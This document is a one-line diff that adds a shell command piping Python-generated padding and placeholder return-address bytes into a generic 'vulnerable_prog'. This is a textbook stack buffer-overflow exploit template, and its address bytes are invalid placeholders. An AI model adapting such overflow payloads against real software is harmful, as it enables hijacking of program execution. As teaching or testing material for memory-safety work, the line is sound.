@@ -1,0 +1,1 @@
+python -c'print"A"*20 +"\xre\xhe\xyt\xhe"' |  /path/vulnerable_prog
